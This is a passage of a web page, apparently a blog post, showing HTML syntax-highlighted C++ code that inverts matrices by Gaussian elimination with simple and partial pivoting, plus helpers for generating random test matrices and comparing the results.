class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\"></span><br><span class=\"line\">//</span>Inside the result, the result <span class=\"keyword\">is</span> <span class=\"keyword\">to</span> be stored as:</span><br><span class=\"line\"><span class=\"regexp\">//i=0 i=1 i=2</span><br><span class=\"line\">//</span>[<span class=\"number\">0</span>] [<span class=\"number\">3</span>] [<span class=\"number\">6</span>]  <span class=\"regexp\">//j=0</span><br><span class=\"line\">//</span>[<span class=\"number\">1</span>] [<span class=\"number\">4</span>] [<span class=\"number\">7</span>]  <span class=\"regexp\">//j=1</span><br><span class=\"line\">//</span>[<span class=\"number\">2</span>] [<span class=\"number\">5</span>] [<span class=\"number\">8</span>]  <span class=\"regexp\">//j=2</span><br><span class=\"line\">//</span></span><br><span class=\"line\"><span class=\"regexp\">//where the above 3x3 matrix is as you would write it on paper.</span><br><span class=\"line\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is mainly used for debug. we can use it to output</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @param m: the matrix that needed to be output</span><br><span class=\"line\"> *        size: the size of matrix</span><br><span class=\"line\"> * @return NULL</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"literal\">void</span> output(double  ** m,int size)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(DEBUG == <span class=\"number\">0</span>) <span class=\"keyword\">return</span> ;<span class=\"regexp\">//Debug is defined in StdAfx.h </span><br><span class=\"line\">    for(int i = 0;i &lt; size;++ i)&#123;</span><br><span class=\"line\">        for(int j = 0;j &lt; size + size;++ j)&#123;</span><br><span class=\"line\">            if(j == size) printf(\"|\\t\");</span><br><span class=\"line\">            printf(\"%f\\t\",m[i][j]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        printf(\"\\n\");</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    printf(\"\\n\");</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * this function is mainly used to swap two lines in a matrix</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @param matrix: the matrix that needed to be swaped</span><br><span class=\"line\"> *        a: the first line which should be swaped</span><br><span class=\"line\"> *        b: the second line which should be swaped</span><br><span class=\"line\"> *        size: the size of the matrix</span><br><span class=\"line\"> * @return NULL</span><br><span class=\"line\"> **/</span><br><span class=\"line\"></span><br><span class=\"line\">void swap(double ** matrix,int a,int b,int size)&#123;</span><br><span class=\"line\">    output(matrix,size);</span><br><span class=\"line\">    double tmp[1000];</span><br><span class=\"line\">    memcpy(tmp,matrix[a],size * 2 * sizeof(double));</span><br><span class=\"line\">    memcpy(matrix[a],matrix[b], size * 2 * sizeof(double));</span><br><span class=\"line\">    memcpy(matrix[b],tmp,size * 2 * sizeof(double));</span><br><span class=\"line\">    output(matrix,size);</span><br><span class=\"line\">    return ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * this function is used to get the Max line of the matrix and swap it to the first line</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @param tmp: the matrix</span><br><span class=\"line\"> *        k: the col that we should find the max line</span><br><span class=\"line\"> *        size: the size of matrix</span><br><span class=\"line\"> * @return NULL</span><br><span class=\"line\"> **/</span><br><span class=\"line\">void getMax(double ** tmp, int k,int size)&#123;</span><br><span class=\"line\">    int Max = k;</span><br><span class=\"line\">    for(int i = k + 1;i &lt; size;++ i)&#123;</span><br><span class=\"line\">        if(fabs(tmp[i][k]) &gt; fabs(tmp[Max][k])) Max = i; //g</span>et the max line</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(Max != k) &#123;</span><br><span class=\"line\">        swap(tmp,Max,k,size);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to do the most important things, invert the matrix</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @param matrix: the matrix that needed to be inverted</span><br><span class=\"line\"> *        type: it is the simple one or pivot one</span><br><span class=\"line\"> *              1: pivot 2:simple</span><br><span class=\"line\"> *        size: the size of matrix;</span><br><span class=\"line\"> **/</span> </span><br><span class=\"line\">double ** runTmp(double ** matrix, bool type,int size)&#123;</span><br><span class=\"line\">\tint i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    double div;</span><br><span class=\"line\"></span><br><span class=\"line\">    double ** tmp = <span class=\"keyword\">new</span> double*[size];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; size;i ++)&#123;</span><br><span class=\"line\">        tmp[i] = <span class=\"keyword\">new</span> double[size + size];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; size;++ i)&#123;<span class=\"regexp\">//read matrix into tmp matrix and add i after matrix</span><br><span class=\"line\">        for(int j = 0;j &lt; size + size;++ j)&#123;</span><br><span class=\"line\">            if(j &lt; size) tmp[i][j] = matrix[i][j];</span><br><span class=\"line\">            else tmp[i][j] = (j - size == i);//i</span>f <span class=\"literal\">it</span> <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> the original matrix, add <span class=\"number\">1s</span> <span class=\"keyword\">and</span> <span class=\"number\">0s</span> <span class=\"keyword\">to</span> the i matrix</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int k = <span class=\"number\">0</span>;k &lt; size;++ k)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(type) getMax(tmp,k,size);<span class=\"regexp\">//if it is pivot one, just get the max line and swap it to the first line</span><br><span class=\"line\">        while(tmp[k][k] == 0 &amp;&amp; k &lt; size - 1) swap(tmp,k,k + 1,size), ++k;//</span><span class=\"keyword\">try</span> <span class=\"keyword\">to</span> get the <span class=\"literal\">no</span>-zero line </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!tmp[k][k])&#123;<span class=\"regexp\">// this maxtrix is not invertable</span><br><span class=\"line\">            printf(\"This Matrix can\\'t be inverted\\n\");</span><br><span class=\"line\">            exit(0);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        for(i = k + 1;i &lt; size;++ i)&#123;</span><br><span class=\"line\">            if((div = tmp[i][k] / tmp[k][k]) == 0) continue;</span><br><span class=\"line\">            for(int j = k;j &lt; size + size;++ j)&#123;</span><br><span class=\"line\">                tmp[i][j] -= div * tmp[k][j];//</span> solve <span class=\"keyword\">this</span> line</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int k = size - <span class=\"number\">1</span>;k &gt;= <span class=\"number\">0</span>;-- k)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = k;i &gt;= <span class=\"number\">0</span>;-- i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!tmp[k][k])&#123;</span><br><span class=\"line\">                printf(<span class=\"string\">\"This Matrix can\\'t be inverted\\n\"</span>);</span><br><span class=\"line\">                exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>((div = tmp[i][k] / tmp[k][k]) == <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(int j = size + size - <span class=\"number\">1</span>;j &gt;= <span class=\"number\">0</span>;-- j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(i == k) tmp[i][j] /= tmp[k][k];</span><br><span class=\"line\">                <span class=\"keyword\">else</span> tmp[i][j] -= div * tmp[k][j]; </span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        output(tmp,size);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> tmp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to do simple inversion</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @param matrix: the matrix that needed to be inverted</span><br><span class=\"line\"> *        size: the size of matrix</span><br><span class=\"line\"> * @return the matrix that has been inverted</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\">double ** simpleMatrixInversion( double ** matrix ,int size)&#123;</span><br><span class=\"line\">    int i = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"regexp\">//insert your code here.//</span></span><br><span class=\"line\">    double ** tmp = runTmp(matrix, <span class=\"number\">0</span>,size);</span><br><span class=\"line\">    <span class=\"regexp\">//declare and allocate the result</span><br><span class=\"line\">    double ** result = new double*[size];</span><br><span class=\"line\">    for(i = 0; i&lt;size; i++)&#123;</span><br><span class=\"line\">        result[i] = new double[size];</span><br><span class=\"line\">        for(int j = 0;j &lt; size;++ j)&#123;</span><br><span class=\"line\">            result[i][j] = tmp[i][j + size];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\treturn result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * this function is used to do pivot inversion</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @param matrix: the matrix that needed to be inverted</span><br><span class=\"line\"> *        size: the size of matrix</span><br><span class=\"line\"> * @return the matrix that has been inverted</span><br><span class=\"line\"> **/</span><br><span class=\"line\"></span><br><span class=\"line\">double ** partialPivotInversion( double ** matrix,int size )&#123;</span><br><span class=\"line\">\tint i = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//i</span>nsert your code here.<span class=\"regexp\">//</span><br><span class=\"line\">    double ** tmp = runTmp(matrix,1,size);</span><br><span class=\"line\"></span><br><span class=\"line\">\t//</span>declare <span class=\"keyword\">and</span> allocate the result</span><br><span class=\"line\">    double ** result = <span class=\"keyword\">new</span> double*[size];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i&lt;size; i++)&#123;</span><br><span class=\"line\">        result[i] = <span class=\"keyword\">new</span> double[size];</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int j = <span class=\"number\">0</span>;j &lt; size;++ j)&#123;</span><br><span class=\"line\">            result[i][j] = tmp[i][j + size];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to plus one line to another line</span><br><span class=\"line\"> * this function is used in generate step</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @param m:the matrix that needed to be changed</span><br><span class=\"line\"> *        size: the size of maxtrix</span><br><span class=\"line\"> * @return NULL</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"literal\">void</span> linePlus(double ** m, int size)&#123;</span><br><span class=\"line\">    double times = getRandDouble();</span><br><span class=\"line\">    int line1 = rand() % size, line2 = rand() % size;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i = <span class=\"number\">0</span>;i &lt; size;++ i)&#123;</span><br><span class=\"line\">        m[line1][i] += m[line2][i] * times;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to generate matrix</span><br><span class=\"line\"> * @param size: the size of matrix that needed to be generated</span><br><span class=\"line\"> * @return the generated matrix</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\">double ** generateMatrix(int size)&#123;</span><br><span class=\"line\">    srand((unsigned)time(NULL));</span><br><span class=\"line\">    double ** m = <span class=\"keyword\">new</span> double *[size];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i = <span class=\"number\">0</span>;i &lt; size;++ i) m[i] = <span class=\"keyword\">new</span> double[size];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i = <span class=\"number\">0</span>;i &lt; size;++ i)&#123;</span><br><span class=\"line\">        m[i][i] = getRandDouble();<span class=\"regexp\">//get the initiate matrix, whose main line are random doubles and others are 0s.</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    int times = size * 8; //</span>we need <span class=\"keyword\">to</span> modify <span class=\"keyword\">this</span> matrix <span class=\"string\">\"times\"</span> times. we set times = size * <span class=\"number\">8</span></span><br><span class=\"line\">    printf(<span class=\"string\">\"Time = %d\\n\"</span>,times);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i = <span class=\"number\">0</span>;i &lt; times;++ i)&#123;</span><br><span class=\"line\">        linePlus(m, size);<span class=\"regexp\">//add a random line to another random line</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ofstream out(\"./debug/generate\");//</span>output the matrix <span class=\"keyword\">to</span> a file</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i = <span class=\"number\">0</span>;i &lt; size;++ i)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int j = <span class=\"number\">0</span>;j &lt; size;++ j)&#123;</span><br><span class=\"line\">            out &lt;&lt; m[i][j] &lt;&lt; <span class=\"string\">' '</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        out &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    printf(<span class=\"string\">\"Matrix has been stored to ./debug/generate\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> m;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to compare two matrix</span><br><span class=\"line\"> * @param two matrix and their size</span><br><span class=\"line\"> * @return if they are same</span><br><span class=\"line\"> * tip: this eps is defined in StdAfx.h </span><br><span class=\"line\"> **/</span></span><br><span class=\"line\">bool compare(double ** m1, double ** m2,int size)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i = <span class=\"number\">0</span>;i &lt; size;++ i)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int j = <span class=\"number\">0</span>;j &lt; size;++ j)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(fabs(m1[i][j] - m2[i][j]) &gt; eps) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"regexp\">// <span class=\"comment\">###     ###     ###    ####### ###     ###    ###     ### ####### ####### ###   ###   ######   ######  </span></span><br><span class=\"line\">//</span> <span class=\"comment\">####   ####    #####   ####### ####    ###    ####   #### ####### ####### ###   ###  ########  ####### </span></span><br><span class=\"line\"><span class=\"regexp\">// <span class=\"comment\">##### #####    #####     ###   #####   ###    ##### ##### ###       ###   ###   ### ########## ########</span></span><br><span class=\"line\">//</span> <span class=\"comment\">###########   ### ###    ###   ######  ###    ########### #######   ###   ######### ####  #### ###  ###</span></span><br><span class=\"line\"><span class=\"regexp\">// <span class=\"comment\">### ### ###   ### ###    ###   ### ### ###    ### ### ### #######   ###   ######### ###    ### ###  ###</span></span><br><span class=\"line\">//</span> <span class=\"comment\">###  #  ###  ###   ###   ###   ###  ######    ###  #  ### ###       ###   ######### ####  #### ###  ###</span></span><br><span class=\"line\"><span class=\"regexp\">// <span class=\"comment\">###     ###  #########   ###   ###   #####    ###     ### ###       ###   ###   ### ########## ########</span></span><br><span class=\"line\">//</span> <span class=\"comment\">###     ###  ######### ####### ###    ####    ###     ### #######   ###   ###   ###  ########  ######## </span></span><br><span class=\"line\"><span class=\"regexp\">// <span class=\"comment\">###     ###  ###   ### ####### ###     ###    ###     ### #######   ###   ###   ###   ######   ######  </span></span><br><span class=\"line\"></span><br><span class=\"line\">//</span>execution format : [executable name] [argument]</span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int size;</span><br><span class=\"line\">\t<span class=\"regexp\">///usage handling</span><br><span class=\"line\">\tif( argc == 1 )&#123;</span><br><span class=\"line\">\t\tdefaultOutput();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//</span>/file format handling</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>( argc == <span class=\"number\">2</span> &amp;&amp; ( strcmp(argv[<span class=\"number\">1</span>], <span class=\"string\">\"-format\"</span>)==<span class=\"number\">0</span> ) )&#123;</span><br><span class=\"line\">\t\tfileFormat();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"regexp\">///invert</span><br><span class=\"line\">\tif( argc == 2 &amp;&amp; ( strcmp(argv[1], \"-format\")!=0 ) )&#123;</span><br><span class=\"line\">\t\tdouble ** matrix = parseMatrixFile( argv[1], &amp;size );</span><br><span class=\"line\"></span><br><span class=\"line\">        if(strcmp(argv[1],\"-g\") == 0) &#123;</span><br><span class=\"line\">            matrix = generateMatrix(3);</span><br><span class=\"line\">            printf(\"Generate matrix with order 3\\n\");</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t//</span>compute the simple inverse <span class=\"keyword\">and</span> <span class=\"built_in\">print</span> <span class=\"literal\">it</span></span><br><span class=\"line\">\t\tdouble ** simpleInverse = simpleMatrixInversion( matrix,size);</span><br><span class=\"line\">        printf(<span class=\"string\">\"The simple inverse result is:\\n\"</span>);</span><br><span class=\"line\">\t\tprintMatrix(simpleInverse,size);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"regexp\">//compute the inverse with partial pivoting and print it</span><br><span class=\"line\">\t\tdouble ** partialInverse = partialPivotInversion( matrix,size);</span><br><span class=\"line\">        printf(\"The pivot inverse result is:\\n\");</span><br><span class=\"line\">\t\tprintMatrix(partialInverse,size);</span><br><span class=\"line\">        if(compare(simpleInverse,partialInverse,size)) printf(\"Same\\n\");</span><br><span class=\"line\">        else printf(\"Different\\n\");</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t//</span>clean up</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(int i = <span class=\"number\">0</span>; i&lt;size; i++)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">delete</span>[](simpleInverse[i]);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">delete</span>[](partialInverse[i]);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">delete</span>[](matrix[i]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">delete</span>[](simpleInverse);</span><br><span class=\"line\">\t\t<span class=\"keyword\">delete</span>[](partialInverse);</span><br><span class=\"line\">\t\t<span class=\"keyword\">delete</span>[](matrix);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(argc == <span class=\"number\">3</span> &amp;&amp; (strcmp(argv[<span class=\"number\">1</span>], <span class=\"string\">\"-g\"</span>) == <span class=\"number\">0</span>))&#123;</span><br><span class=\"line\">        size = atoi(argv[<span class=\"number\">2</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(size &lt; <span class=\"number\">2</span>)&#123;</span><br><span class=\"line\">            printf(<span class=\"string\">\"The size of matrix must bigger than 1\\n\"</span>);</span><br><span class=\"line\">            exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        double ** matrix = generateMatrix(size);</span><br><span class=\"line\">        printf(<span class=\"string\">\"Matrix size %dx%d generated\\n\"</span>,size,size);</span><br><span class=\"line\">        printMatrix(matrix,size);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span 